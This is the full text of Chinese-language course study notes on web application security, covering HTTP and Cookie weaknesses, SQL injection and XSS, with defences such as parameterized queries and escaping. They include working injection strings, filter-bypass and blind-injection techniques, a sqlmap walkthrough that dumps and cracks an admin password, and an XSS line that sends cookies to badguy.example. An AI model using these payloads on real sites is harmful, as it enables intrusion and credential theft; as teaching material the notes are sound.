Chapter 9 · Web Application Security

Web 应用安全

你在一个网页的输入框里敲下的每一个字，最后都会被拼进服务器上的某一句话里——拼进 SQL 语句、拼进返回的 HTML、拼进一条 Shell 命令、拼进一个文件路径、拼进一行 HTTP 响应头。这一章讲的就是：当服务器分不清「哪一段是我写的代码、哪一段是用户填的数据」时，会发生什么，以及怎么让它分得清。

本页按老师 PPT 的顺序和详略组织：PPT 用 22 页讲体系结构脆弱性、61 页讲七种攻击、10 页讲 HTTPS、9 页讲 WAF，本页篇幅照这个比例分配。唯独 HTTP over QUIC 一节破例——PPT 正文只有 2 页，但它在内容提纲里占一整节，且课本用了 1.5 页、习题第 15 题直接考它（见该节开头的说明）。每一节先给 PPT 抛出的真实问题，再讲机制，最后说明它留下了什么新问题——那正是下一节的由来。

第 0 节 · 总览

这一章在解决什么问题

前面八章讲的是网络的安全：链路、IP、传输层、DNS。到这一章，攻击面整个换了地方——网络本身可以是完好的，加密可以是正常的，防火墙可以是开着的，网站照样被攻破。因为出问题的不是管子，是管子那头的程序。

PPT 第 2 页 · 这一章的五个一级标题

一台补丁打全、防火墙配好、全站 HTTPS 的服务器，为什么还是会被人拖走整个用户表？

因为前八章的所有防护都在保护「传输」：不让别人偷看、不让别人篡改、不让别人冒充。但 SQL 注入的那条请求既没被偷看也没被篡改——它就是用户自己敲进去的，规规矩矩地从 443 端口加密传到服务器，然后服务器自己把它拼进了一条 SQL 语句。

PPT 开篇给的两个现实例子
  • Log4j 漏洞事件PPT p.4：2021 年 12 月公开，被称为「核弹级」漏洞。仅一个多月就衍生出 8 个漏洞，其中 5 个远程代码执行、1 个 SQL 注入、2 个拒绝服务，高危以上占 7 个。这不是网络层的问题，是应用怎么处理外来字符串的问题。
  • HTTP 会话在中国移动网络里被劫持的实测PPT p.8：一项 2018 年的测量研究搭了自己的 Web 服务器，统计了 33 439 次 HTTP 会话，其中 1291 次（3.9%）发生劫持；按自治系统统计，79 个 AS 里有 45 个（57%）存在劫持行为，31 个省里有 30 个（97%）观察到。明文 HTTP 在真实网络里不是「理论上不安全」，是每天都在被改。

这两件事分别对应本章的两条主线：应用自己的漏洞（第 1、2 节）和通信本身的裸奔（第 3、4 节），最后是当两者都补不完时的兜底（第 5 节 WAF）。

全章因果链：一个病根，十种病灶

学生觉得这一章「散」，是因为它看上去是七八种互不相干的攻击名词。实际上它们几乎全部来自同一句话：Web 应用会把外部输入拼进某种「解释器」能读懂的语句里，而拼接的时候分不清哪段是代码、哪段是数据。换一个解释器，就换一个漏洞名字。

起点
HTTP 是无状态的PPT p.7。协议本身不记得你是谁，每条请求都是孤立的。
补丁一
用 Cookie 把状态存到客户端PPT p.20。状态问题解决了。
新的坑
Cookie 存在用户手里，能改；不设 secure 就明文传，能听 → Cookie 欺骗、会话劫持
起点
Web 应用必须接受外部输入（不接受就没有交互）。输入最终会被拼进某个解释器。
五个病灶
拼进 SQL → SQL 注入 ｜ 拼进 HTML → XSS ｜ 拼进 Shell → OS 命令注入 ｜ 拼进文件路径 → 目录遍历 ｜ 拼进 HTTP 响应头 → 消息头注入
共同解法
让解释器自己区分代码与数据（参数化查询 / 转义编码 / 不调 Shell / 不由外界指定文件名 / 过滤换行符）。五种攻击的防御措施长得高度相似，不是巧合。
承上
输入校验能挡住上面五种——因为那五种请求里带着不该有的字符。
CSRF
但如果攻击者构造的请求字字合法、连 Cookie 都是真的，只是不是用户本意呢？输入校验一个字都挑不出毛病。
留下的坑
要防它，只能验证「这条请求是不是从我自己的页面发出来的」→ 令牌 / 再次认证 / 查 Referer
承上
应用层的洞一个个补完了，但链路还是明文的——Cookie、口令、页面内容全在网上裸奔PPT p.88。
HTTPS
在 HTTP 和 TCP 之间垫一层 SSL/TLS，同时解决机密性、完整性、服务器身份真实性三件事。
留下的坑
服务器同时开着 80 和 443，用户敲 http:// 就退回明文 → SSL 剥离攻击 → 逼出 HSTS（而 HSTS 自己也有「首次访问不受保护」的洞）
承上
HTTPS 安全了，但 TCP + TLS 两次握手很贵，且 HTTP/2 的多路复用碰上 TCP 丢包会队头阻塞。
QUIC
把可靠传输和加密一起搬到 UDP 上重做：0-RTT、流之间互不阻塞、报文头认证 + 报文体加密。这就是 HTTP/3。
仍然剩下的
协议再安全，应用代码里的洞一个也没少。改不动、也补不完 → 只能在前面加一道看得懂 HTTP 语义的墙 → WAF
🧭 一句话记住整章

前半章是「服务器分不清代码和数据」，后半章是「浏览器分不清对面是谁」。七种攻击属前者（第 2 节），HTTPS / HSTS 属后者（第 3 节），QUIC 是后者的效率改良（第 4 节），WAF 是给前者打的补丁（第 5 节）。

第 1 节 · PPT p.3–24（22 页 · 占 20%）

Web 应用体系结构脆弱性分析

这一节回答一个前置问题：要攻破一个网站，一共有几个地方可以下手？PPT 的答法是先把一次请求经过的所有环节摆出来，再逐个环节问「这里能出什么事」。课本简答第 1 题「简要分析 Web 应用体系的脆弱性」考的就是这一节，官方答案给的提纲正是这里的分层。

PPT 第 3–5 页 · 问题

你点一下「登录」，这条请求在到达那张用户表之前，要经过多少个不同的程序？

直觉上是「浏览器 → 服务器」两步。实际上至少是五段，每一段由不同厂商、不同语言、不同年代的软件负责，彼此只靠约定的接口通信。攻击者不需要五段全破，破一段就够。

这就是为什么 Web 安全不能只谈「加密」——加密只保护了五段里的一段（传输）。

1.1 四层体系结构：请求要过几道手 PPT p.3

依 PPT 第 3 页重绘。注意 Web 服务器和 Web 应用程序是两样东西——前者只管收发 HTTP、发静态文件，后者才跑业务代码。这一区分在讲 WAF 部署时还要用到。

为什么要把「Web 服务器」和「Web 应用程序」分开数

因为它们的漏洞类型完全不同，补丁也来自不同的人。Web 服务器的漏洞（如 IIS/Apache 的某个 CVE）是厂商的事，打补丁就能修；Web 应用程序的漏洞（SQL 注入、XSS）是你自己写的代码的问题，没有任何补丁能修——只能改代码。本章第 2 节的七种攻击，全部属于后者。课本无扫描件 · 本页补写

1.3 ★ 输入 · 处理 · 输出：漏洞的分类法 PPT p.6

这一页的图已经画在总览的知识地图里了。这里只补一句它为什么值得单独当一个考点：

🔑 一个分类，两种防法

输出过程的漏洞（XSS、SQL 注入、OS 命令注入、HTTP 头注入、邮件头注入）——共同点是应用把数据交给另一个解释器时没做转义。防法是在输出的那一刻按目标解释器的规则转义：给 SQL 用参数化查询、给 HTML 做实体编码、给 Shell 做转义、给 HTTP 头查换行符。

处理过程的漏洞（目录遍历、CSRF、会话固定、授权缺陷）——共同点是请求本身合法，是「该不该做」判断错了。防法跟转义无关，是加判断：核对文件名来源、核对请求来源、核对权限。所以「过滤特殊字符」防不了 CSRF——这正是单选第 7 题的考点。

1.4 HTTP 协议本身的安全问题 PPT p.7–9

PPT 列了四条，每一条都不是「实现 bug」，而是协议当年的设计取舍：

1无状态

HTTP 是「简单的、无状态的应用层协议」（RFC 1945 / RFC 2616）。无状态使攻击变得容易——服务器不记得上一条请求是谁发的，只能靠请求里自带的凭据判断。凭据一旦能被伪造或窃取，服务器就分不出真假。Cookie 欺骗、会话劫持、CSRF 三种攻击的共同土壤就是这一条。

2基于 ASCII 明文

「无需弄清复杂的二进制编码机制，攻击者就可了解协议中的明文信息」。门槛低得离谱：一个 telnet 就能手打一条 HTTP 请求，抓包工具不用解码就能读懂全部内容。对比之下，二进制协议至少还需要写解析器。

3中间盒子的理解分歧

互联网中存在大量中间盒子（代理、缓存、CDN、WAF、运营商设备），它们对 RFC 2616 / RFC 7230 的理解如果不一致，就可能导致新的攻击。典型后果：同一串字节，前面的代理认为是「一条请求」，后面的服务器认为是「两条请求」——→ 这就是响应截断与请求走私的原理。

4设计时就没考虑安全

「HTTP 的设计目的是灵活和实时地传送文件，没有考虑安全因素。但使用 HTTP 的各种应用都期盼提供身份鉴别、认证和隐私，这就导致了基于无身份鉴别 HTTP 系统的风险。」——需求和能力之间的落差，就是整章所有攻击的来源。

🌐 PPT p.8 给的实测证据：会话劫持不是理论

一项 2018 年发表于 USENIX FOCI 的测量研究（Zhang 等，《Measuring Privacy Threats in China-Wide Mobile Networks》），在移动网络里搭了自己的 Web 服务器做对照，结果是：33 439 次 HTTP 会话中 1291 次（3.9%）被劫持；30 810 个 IP 中 451 个（1.5%）；31 个省中 30 个（97%）观察到劫持；79 个自治系统中 45 个（57%）存在劫持行为。劫持者是路径上的中间盒子（如运营商的代理服务器），手法是在 HTTP 响应里插入 JS。用 HTTPS 就能挡住这一类——这也是 PPT 把它放在第 3 节之前当引子的用意。

1.5 URL 漏洞（PPT 列了五种玩法） PPT p.10–17

PPT 先复习 URL 的结构：scheme://host:port/path——「Internet 资源类型（scheme）」「服务器地址（host）」「端口（port）」「路径（path）」。然后指出它的方便正是它的危险：「URL 不仅允许标识远程服务和文件，而且也导致暴露攻击的目标。」

PPT 里 URL 漏洞标的是 1）2）4）5）6），没有 3）；后面「常见的 HTTP 风险」标的是 1）2）3）4）6）7）8），没有 5）。这是老师从课本删页时留下的编号，不是遗漏内容。本页保留原编号以便你对着 PPT 找。

1）主机名破解PPT p.11–12

URL 里含主机名，方便人记，也方便人骗。PPT 给的例子是并排两张截图：真的 www.icbc.com.cn（中国工商银行）与假的 www.1cbc.com.cn——把字母 i 换成数字 1。

PPT 的判断很直接：「诸如相似的主机名和自动完成的风险，比直接 DNS 破坏更简单。」——攻击者根本不用去攻 DNS，注册一个形近域名就够了，成本几十块钱。

2）主机伪装PPT p.13–14

整数伪装：URL 里的 host 可以写成域名，也可以写成 IP，而 IP 又可以写成点分十进制、点分八进制、点分十六进制，甚至一个纯十进制/十六进制数字。同一台机器有无数种写法，用户看不出来，过滤规则也容易漏。

路径编码：<url-path> 一般是字母，但也能整段写成十六进制百分号编码。PPT 的例子：spaces.msn.com → %73%70%61%63%65%73%2E%6D%73%6E%2E%63%6F%6D。

域名欺骗式写法：在 URL 里加一段具欺骗性的域名，显示成 http://www.microsoft.com/…，真实地址却是别处。PPT 还举了一串下载工具的私有协议（thunder:// flashget:// qqdl:// ed2k:// magnet:）——它们把真实 URL Base64 编码后藏进链接，肉眼完全看不出指向哪。Base64 这一点为本页补注

4）剪切和拼接PPT p.15

剪切：把 URL 砍掉一段（比如从 /admin/user/list.asp 砍成 /admin/）。「虽然安全服务器返回 404 错误，但很多服务器仍然能被浏览，甚至一些私人的 Web 页面也能被看到」——这就是目录列表泄露。

拼接：往 URL 后面接东西试探。「大部分 Apache Web 服务器有 images 和 icons 目录，在原来 URL 后拼接上 icons 后即使不能打开目录，但返回码的类型能确定 icon 是不是存在」。注意这句话的要害：不需要看到内容，光看「404 还是 403」就能把服务器的目录结构摸出来。

PPT 给的五条缓解措施：①去掉不需要的默认目录；②不开放的目录应关掉；③让「无权限」和「文件不存在」返回同样的错误（这条最关键——攻击者就无法据此识别服务器上的私人资源）；④私人的和临时的文件不放在公共服务器上；⑤内容保密的目录和文件应从公共服务器上去除。

5）SQL 注入PPT p.16

PPT 在「URL 漏洞」下先剧透了一次 SQL 注入，因为注入串通常就写在 URL 的查询参数里。给的例子是永真化 WHERE：

SELECT job_id, job_desc, min_lvl, max_lvl FROM jobs WHERE (job_id = 1) OR 1 = 1

「必须保留 WHERE 语句，那么只要确保 WHERE 恒真就 OK 了」——效果等同于没有 WHERE，整张表被取走。截图里地址栏是 ?jobid=1'or'1'='1，页面上 14 行职位数据全部列出。→ 详见 2.1 节

6）跨站脚本PPT p.17

「XSS 攻击是发生在当攻击者把恶意代码提交给服务器，又被送到另一用户。例如很多在线论坛和博客允许用户张贴内容和超级链接，张贴的东西可以被其他用户访问。」

PPT 点了两个后果：钓鱼网站、Cookie 盗用——「用户执行恶意代码后将自己的 cookie 发给了攻击者，攻击者以此登录目标服务器」。→ 详见 2.2 节，课本简答 8「如何将 Cookie 攻击和 XSS 攻击相结合」考的就是这一句。

1.6 常见的 HTTP 风险 PPT p.18–19

这一组七条讲的不是某一种攻击，而是 HTTP 在设计层面缺的东西。读的时候把每条都还原成一句「协议没做什么」，就串起来了。

PPT 的编号与标题协议缺了什么 / 后果
1）无身份鉴别的客户协议不要求客户证明自己是谁。服务器只能相信请求里带的东西（Cookie、参数）——而那些都在用户手里。→ Cookie 欺骗
2）无身份鉴别的服务器「客户端依据主机名或网络地址访问服务器。主机名识别易受 DNS 攻击的损害，网络地址易受网络拦截破坏。」——纯 HTTP 里没有任何机制让服务器证明自己。这一条正是 HTTPS 要补的洞（证书 = 服务器的身份证明）。
3）客户端隐私「Cookies 和身份鉴别系统可跟踪用户，但只是限制在特定的服务器。」——单个站点就能把你的行为串起来
4）信息泄露请求头泄露浏览器类型、版本、操作系统；响应头泄露服务器类型、版本、插件——等于免费给攻击者做了一次指纹识别，接下来直接查对应版本的 CVE。
还有一条很妙：响应里的时间戳通常是文件的最近修改时间，而 CGI 应用返回的是当前时间。「通过观察时间戳，攻击者能识别数据是静态的（来自文件）还是动态的（来自应用程序）」——而动态页面才可能有注入点，这一步等于替攻击者做了目标筛选。
6）访问操作系统「OSI 应用层直接和主机操作系统接口。HTTP 服务器处理用户发来访问文件或应用程序（经 CGI 程序）的 HTTP 命令，并返回结果，因此通过修改 URL 路径和选项，针对操作系统的漏洞进行远程访问。」→ 目录遍历、→ OS 命令注入都是这一条的具体化
7）不安全的应用程序PPT 只有标题一行。它指的就是整个第 2 节——应用代码自己的洞
8）低层协议「DNS 攻击、TCP 拦截和更低层的攻击也能阻挡 HTTP、拦截信息或拦截连接。」——HTTP 站在别人肩膀上，下面塌了它也就塌了。这正是第 8 章 DNS 安全与本章的接口。

1.7 ★ Cookie 的安全问题 PPT p.20–24

PPT 第 20 页 · 问题（老师原话）

为什么需要 Cookie？

PPT 自己给了答案：「解决无状态问题：保存客户服务器之间的一些状态信息」。HTTP 不记事，所以得找个地方记。而唯一能跟着每条请求自动跑一趟的地方，就是客户端。

整章的 Cookie 相关攻击，都源于「记事本放在了对方手里」这一个决定。

📖 定义（PPT p.20 原文）

Cookie 是指网站为了辨别用户身份、进行会话跟踪而储存在用户本地终端上的一些数据（通常经过编码），最早由网景公司的 Lou Montulli 在 1993 年 3 月发明，后被采纳为 RFC 标准（RFC 2109、RFC 2965）。

生成与维护 PPT p.21–22

  • 谁生成：由服务器端生成，发送给客户端；浏览器把值保存到某个目录下的文本文件里，下次请求同一网站时自动发回（前提是浏览器开启了 Cookie）。
  • 生存周期：生成时就指定 Expire，到期自动清除。
  • 互不共享：一台机器装多个浏览器，每个浏览器在各自独立的空间存放 Cookie。（所以「换个浏览器就要重新登录」不是 bug）
  • 内容大多经过编码处理——注意 PPT 用的词是「编码」不是「加密」。编码是可逆且无密钥的，任何人都能还原。

格式 PPT p.23

NAME=VALUE; expires=DATE; path=PATH; domain=DOMAIN_NAME; secure

PPT 给的示例（域名已换成 RFC 2606 的保留示例域名）：

autolog=bWlrzTpteXMxy3IzdA%3D%3D; expires=Sat, 01-Jan-2018 00:00:00 GMT; path=/; domain=victim.example
⚠ 六个字段，五个都是考点
字段作用安全含义
NAME=VALUE实际数据存了什么，就能被改成什么。示例里那串 bWlrzTpteXMxy3IzdA%3D%3D 是 Base64（%3D 就是 = 的 URL 编码）——看着像密文，其实一解就开
expires过期时间设得越长，被盗后可用的窗口越长。单选第 1 题的 D 选项「把生存周期设为 0 或负值」是提高安全性的做法（等于会话结束即失效）
path作用路径限制发送范围，越窄越好
domain作用域名单选第 1 题的正确答案就在这里。设了 domain=example.com，Cookie 会被发给所有子域名（a.example.com、b.example.com…）；不设则只发给签发它的那一台主机。所以「设置 domain 属性」是扩大暴露面，不建议
secure仅 HTTPS 发送不设它，Cookie 就在网络上明文跑。→ 2.3 节会话劫持
HttpOnly禁止 JS 读取PPT 与课本这一章都没提，但它是防 XSS 偷 Cookie 的标准手段。本页补注，考试不作要求
🔑 PPT p.24 的结论句（背它）

「Cookie 中包含了一些敏感信息，如用户名、计算机名、使用的浏览器和曾经访问的网站等，攻击者可以利用它来进行窃密和欺骗攻击。」——窃密对应「听」（会话劫持），欺骗对应「改」（Cookie 欺骗）。两条路，2.3 节各讲一遍。

2.0 注入漏洞总论：同一个病根 PPT p.27–28

🔑 PPT p.27 的那句总纲

「任何依赖于解释执行的 Web 应用都有被注入漏洞攻击的危险！」——PPT 特意加了感叹号。这句话是本节前几种攻击的统一解释：只要你的程序把一段字符串交给另一个会「读懂并执行」它的东西，而那段字符串里混进了用户可控的内容，就有注入。

PPT 列的「最普遍的注入漏洞」只有两条——SQL 注入（通过 SQL 语句恶意地调用后台数据库）和系统调用（通过 shell 命令调用外部程序）。但把本章后面几节摊开看，它们其实是同一个模子刻出来的五兄弟：

SQL 注入解释器 = 数据库

拼进 SQL 语句。用户输入里的 ' OR -- 被当成语法而不是数据。→ 2.1

XSS解释器 = 浏览器

拼进返回的 HTML。用户输入里的 <script> 被浏览器当成标签而不是文字。→ 2.2

OS 命令注入解释器 = Shell

拼进 shell 命令行。用户输入里的 ; | & 被 Shell 当成命令分隔符。→ 2.6

目录遍历解释器 = 文件系统

拼进文件路径。用户输入里的 ../ 被文件系统当成「上一级」指令而不是文件名的一部分。→ 2.5

HTTP 头注入解释器 = HTTP 解析器

拼进响应消息头。用户输入里的 %0D%0A 被解析器当成「一行结束」，于是凭空多出一个消息头。→ 2.7

📌 会做这一张表，五道题一起解决

五种攻击的防御措施都能压缩成同一句：「不要用字符串拼接构造给解释器的语句，改用该解释器提供的『把数据当数据』的接口」——SQL 用参数化查询、HTML 用实体编码、Shell 用不调 Shell 的库函数、文件用编号间接指定、HTTP 头用专门的重定向 API。看到「过滤特殊字符」四个字要警惕：它是所有这五种攻击的次优解（因为编码绕过防不胜防），而且对 CSRF 完全无效。

补PPT p.28 顺带复习的「SQL 的六项功能」

PPT 在讲注入之前先把 SQL 能干什么列了一遍。这不是废话——它决定了一次注入的破坏上限：注入点拿到的不只是「查数据」的能力。

  1. 数据查询　—— 拖库从这里开始
  2. 数据操作：插入、修改、删除表中的行 —— 能改能删，不只是能看
  3. 事务处理：传输、提交、恢复修改的数据等
  4. 数据控制：控制对数据库对象的访问 —— 能给自己授权
  5. 数据定义：创建、删除表，为表加索引 —— 能建表能删表
  6. 指针控制：用于对一个或多个表单操作

2.1 ★ SQL 注入攻击及防范 PPT p.26–41（16 页，本节最重）

PPT 第 29 页 · 问题

一句用来查身份证号的 SQL，怎么会把整张用户表交出去？

程序员写的是这样一句（PPT 原文）：

"SELECT * FROM USERS WHERE SSN='" + ssn + "'"

「SSN 参数来自于用户的输入，参数未经验证或编码」。黑客输入的不是身份证号，而是：

1234' OR '1'='1

于是应用程序老老实实地构造出这条语句：

SELECT * FROM USERS WHERE SSN='1234' OR '1'='1'

结果返回数据库中的每一个用户。PPT 给这个现象起的名字是三个字：永真逻辑。

原理：这不是「猜密码」，是「改语法」

很多人第一次看这个例子会误以为攻击者「猜中了什么」。什么也没猜。要害在于那个 '：

  • 程序员心里的模型是：引号里面是数据，引号外面是代码。
  • 但拼接是纯文本操作——它不知道引号的意义。用户输入里自带一个 '，就把「数据区」提前关掉了，后面的 OR '1'='1 顺理成章地落在了「代码区」。
  • 数据库收到的是一条语法完全正确的语句。它没有任何办法知道这句话有一半不是程序员写的。

这就是为什么「过滤引号」只是权宜之计，而「参数化查询」是根治：后者从通道上就把数据和代码分开传，数据库先拿到语句结构、后拿到参数值，两者永远不会混。

为什么要写两个 or？因为登录 SQL 是 … WHERE user='␣' AND pass='␣'，AND 的优先级高于 OR。只写一个 or '1'='1 会被解析成 user='' OR ('1'='1' AND pass='x')——整体仍然是假。加上第二个 or 1=1 后变成 假 OR 真 OR (真 AND 假) = 真。这个细节几乎所有资料都不讲，但它正是「为什么有的注入串管用、有的不管用」的答案。上面的实验台里可以两串各试一次。优先级分析为本页补写

⚠ 这一小节 PPT 只列了三个标题，没有内容

PPT 第 33 页原文只有三行：「1、整型参数时的 SQL 注入漏洞探测　2、字符串型参数时的 SQL 注入漏洞探测　3、特殊情况的处理」——展开在课本 9.3.2 节（p.273–277），而这几页没有扫描件。下面按标准做法补写，习题简答第 2 题就考这三条，官方答案标「略」。

先看 PPT 给的两条前提（p.32 原文）：

  • 「一般来说，只要是带有参数的动态网页且此网页访问了数据库，那么该页面就有可能存在 SQL 注入漏洞。如果程序员安全意识不强，没有过滤输入的一些特殊字符，则存在 SQL 注入的可能性就非常大。」
  • 「在探测过程中，需要分析服务器返回的详细错误信息。而在默认情况下，浏览器仅显示『HTTP 500 服务器错误』，并不显示详细的错误信息。为此，需要把 IE 的【工具】→【Internet 选项】→ 高级 →【显示友好 HTTP 错误信息】前面的勾去掉。」

第二条今天看已经过时（现代浏览器不再有这个开关，改用开发者工具的「网络」面板看响应正文），但它背后的道理没变：探测的全部依据是「服务器对不同输入的反应差异」。

探测的标准靶子是形如 http://xxx.xxx.xxx/abc.asp?id=YY 的带参动态页，YY 是参数值。

① 整型参数：三条经典测试

整型参数在 SQL 里不带引号（WHERE id=YY），所以注入串可以直接接上去。

在 URL 后追加拼出的 SQL正常站点有注入点的站点
?id=YY'… WHERE id=YY'参数被当字符串处理或被过滤，页面正常 / 提示参数错误数据库语法错误（多出一个引号），页面报 ODBC / SQL 错误
?id=YY and 1=1… WHERE id=YY and 1=1报错或过滤页面与 ?id=YY 完全相同（条件恒真，不改变结果）
?id=YY and 1=2… WHERE id=YY and 1=2报错或过滤页面异常 / 内容为空（条件恒假，查不到行）
🔑 判据（这是答题要点）

三条同时满足——加单引号报错、and 1=1 正常、and 1=2 异常——就基本可以断定存在整型 SQL 注入点。
为什么要 1=1 和 1=2 两条一起做？因为只做 1=1 无法区分「注入成功」和「参数被忽略」——两种情况页面都正常。必须用 1=2 制造一次「本该有结果却没有」，才能证明你的条件真的进了 WHERE 子句。

② 字符串型参数：先把引号闭合

字符串参数在 SQL 里是带引号的（WHERE name='YY'），直接接 and 1=1 只会变成字符串的一部分。所以每一条测试都要自带一个单引号把前面的引号闭合，再自带一个开引号让后面的收尾引号有着落：

在 URL 后追加拼出的 SQL有注入点时
?name=YY'… WHERE name='YY''引号不配对 → 语法错误
?name=YY' and '1'='1… WHERE name='YY' and '1'='1'页面正常（末尾的 ' 由程序自己补上，正好配对）
?name=YY' and '1'='2… WHERE name='YY' and '1'='2'页面异常 / 无数据

口诀：整型加 and 1=1，字符型加 ' and '1'='1——差别只在「要不要自己带引号」。上面的实验台里把「参数类型」切成字符串再试一次，能看到引号配对的全过程。

③ 特殊情况的处理
A关键字被过滤

程序过滤了 '、and、select 等。绕法：大小写混写（AnD）、URL 编码（%27 = '）、双写（anandd，过滤器删掉中间的 and 后反而拼回了 and）、用等价写法（&& 代 and、/**/ 代空格）。

B不回显错误信息

站点关掉了详细报错，只给统一的 500 或友好页面。改用盲注：布尔盲注——只看页面「有内容 / 没内容」这一位信息，用 and (子查询) = 某值 一位一位试出数据；时间盲注——条件成立时让数据库睡几秒（如 SQL Server 的 waitfor delay '0:0:5'），用响应时间当返回值。

C参数不在 URL 里

用 POST 提交、或藏在 Cookie / 自定义请求头里。这时地址栏改不了，要用抓包改包工具（Burp、Fiddler）或 sqlmap 的 --data / --cookie 参数。

D参数被强制转型

程序对整型参数做了 int() 转换，非数字直接被丢掉——这一处就没有注入了。探测时要一个参数一个参数试，不能因为一个参数安全就下结论。

「简述 SQL 注入攻击漏洞的探测方法」→ ①先定目标：带参数、且访问数据库的动态页面；②整型参数用 ' / and 1=1 / and 1=2 三连，看「报错—正常—异常」；③字符串型参数同样三连，但每条都要自带单引号闭合（' and '1'='1）；④特殊情况：关键字过滤用大小写/编码绕过，无回显用布尔盲注或时间盲注，非 URL 参数用抓包改包；⑤自动化：用 sqlmap 之类工具批量探测与利用。

Sqlmap 五步实战 PPT p.34–40

PPT 用整整 7 页贴了 sqlmap 的实操截图。老师肯花 7 页贴截图，说明他要你记住这条流水线的形状——从「有没有注入点」一路到「登进后台」，中间只有五条命令。

1
检测注入点是否可用
sqlmap.py -u "http://靶机/ProductShow.asp?ID=56"
输出：GET parameter 'ID' is vulnerable，并列出探到的注入类型（boolean-based blind 与 UNION query）、后端 DBMS（Microsoft Access）、服务器（Windows + IIS 6.0 + ASP）。共发了 88 个 HTTP 请求。
为什么第一步就能知道 DBMS 和操作系统：不同数据库的报错文本、函数名、注释语法各不相同，工具靠这些差异做指纹识别。这也回过头解释了 1.6 节「信息泄露」为什么算风险。
2
列出数据库的表
sqlmap.py -u "…?ID=56" --tables
输出 8 张表：user / admin / download / feedback / market / news / product / province。
注意 admin 这张表——攻击者的目光一定先落在它上面。
3
列出指定表中的字段
sqlmap.py -u "…?ID=56" -T admin --columns
输出 4 列：data、id、password、username。
到这一步为止，一行真实数据都还没取——摸的全是「元数据」。很多站点的日志里这类查询看起来毫无异常。
4
导出表记录
sqlmap.py -u "…?ID=56" -T admin -C "id,data,username,password" --dump
输出 1 条：id=1, username=admin, password=3acdbb255b45d296。
口令是散列值，不是明文——站点这一点做对了。但只做对这一点不够，见下一步。
5
还原口令并登录后台
PPT 原文：「通过 MD5 反查，得到该 password 散列的原文密码为 0791idc。拿到管理员账号密码直接成功登录网站后台。」最后一张截图就是后台管理界面。
为什么散列还是被还原了：这个散列没有加盐（salt），于是「口令→散列」的映射是全网通用的固定映射，在线彩虹表站点直接一查就出。这一步把第 3 章「散列函数」和本章接上了：散列不可逆 ≠ 口令安全，不加盐的散列对常见口令毫无保护力。加盐解释为本页补写

防御：从「过滤」到「根治」 PPT p.41

PPT 的三条（原文）：

  1. 使用特定语言的库函数来代替 shell 命令和系统调用；
  2. 对用户输入的信息进行严格检查和过滤：数据类型（字符串、整数等）正确吗？使用的是允许的字符集吗？输入满足格式要求吗？……
  3. 使用「最小权限」限制数据库用户的权限。
🔑 三条各管一段，缺一不可（这是简答 3 的答法）
措施它管的是哪一段
用库函数不让危险的拼接发生。对 SQL 而言，对应的就是参数化查询 / 预编译语句（PreparedStatement、? 占位符）：语句骨架先发给数据库，参数值后发，数据库永远不会把参数值当语法解析。这是根治，上面实验台里可以直接对比。
输入检查在拼接之前把明显不合法的挡掉。类型对不对（应该是整数吗）、字符集允不允许、格式满不满足。它是纵深防御的第一层，但不能作为唯一手段——编码绕过、双写绕过太多。
最小权限限制万一被打穿时的损失。Web 应用连库的账号不该有 DROP、不该能读别的库、不该是 sa/root。注入还是会发生，但拖不走整个实例。

还可以补两条常识性的本页补写：④关闭详细报错（探测的全部依据是报错差异）；⑤口令加盐存储（让第 5 步的 MD5 反查失效）。

2.2 ★ 跨站脚本攻击（XSS）及防范 PPT p.42–55（14 页）

PPT 第 43 页 · 问题

我在论坛发一条留言，凭什么能让别人的浏览器替我干活？

PPT 把机理压成两句话：

  • 工作原理：输入插入包含有 JavaScript 或其它恶意脚本的 HTML 标签代码。
  • 问题根源：不当的服务器端输入检查，从而允许用户输入可被客户端浏览器解释的脚本命令。

并给了最小可用的例子：

<script> window.open( http://badguy.example/info.pl?document.cookie ) </script>

PPT 的定性是一句话：XSS 是最普遍的 Web 程序安全问题。

原理：浏览器凭什么信这段脚本

关键在同源策略下的一条规则：浏览器判断一段脚本有没有权限访问某个网站的 Cookie，看的是「这段脚本是从哪个域下载来的」，而不是「谁写的」。

所以当 example.com 的页面里出现了一段 <script>——无论那段字是网站作者写的，还是某个用户填进留言板被原样吐回来的——在浏览器眼里它就是 example.com 的脚本，享有该站点的全部权限：读 Cookie、读 DOM、以你的身份发请求。PPT p.44 的图上写得很清楚：「运行于受害者浏览器的脚本可以完全访问 DOM 和 cookies」。

📖 PPT p.44 给的四步框架
  1. 攻击者将恶意脚本输入到服务器上的 Web 页面（= 设置陷阱）
  2. 受害者浏览页面
  3. 脚本将受害者的 Session、Cookie 发送给攻击者
  4. 攻击者拿着 Cookie 以受害者身份登录
🖼 PPT p.45 的探测实拍：一个搜索框就够了

截图是某银行首页。PPT 的注解：「Search 框内的文本信息常会反馈回用户页面」——这就是可疑点。在框里填入攻击测试脚本：

<script>alert(document.cookie)</script>
结果「脚本执行并将 Session 信息通过对话框显示出来」，弹窗里赫然是 JSESSIONID=97A901BEE66F21CA8DA147A3F16F372B。
这一步的意义：能弹出 Cookie，就等于证明「我能读到它，也就能把它发走」。探测用 alert 是因为它无害、直观、一眼可见。

PPT 对反射式的完整叙述（p.46–48）

PPT 给了三层描述，从定义到步骤再到人物故事，值得逐层抄：

📖 定义（p.46 原文）

反射式 XSS「也称为非持久性跨站脚本攻击，是一种最常见的跨站脚本攻击类型」。

「Web 客户端使用 Server 端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经 HTML 实体编码，客户端代码便能够注入到动态页面中。」

「在这种攻击模式下，Web 程序不会存储恶意脚本，它会将未经验证的数据通过请求发送给客户端，攻击者就可以构造恶意的 URL 链接或表单并诱骗用户访问，最终达到利用受害者身份执行恶意代码的目的。」

🎭 PPT p.48 的 Alice / Bob / Charly 故事（这是很好的答题模板）
  1. Alice 经常浏览 Bob 建立的网站。Bob 的站点允许 Alice 用用户名/口令登录，并存储敏感信息（比如银行账户信息）；
  2. Charly 发现 Bob 的站点包含反射性的 XSS 漏洞；
  3. Charly 编写一个利用漏洞的 URL，并冒充为来自 Bob 的邮件发送给 Alice；
  4. Alice 在登录到 Bob 的站点后，浏览 Charly 提供的 URL；
  5. 嵌入到 URL 中的恶意脚本在 Alice 的浏览器中执行，就像它直接来自 Bob 的服务器一样。此脚本盗窃敏感信息（授权、信用卡、账号信息等），然后在 Alice 完全不知情的情况下将这些信息发送到 Charly 的 Web 站点。
⚠ 第 4 步藏着反射式 XSS 的前提条件（简答 4 考它）

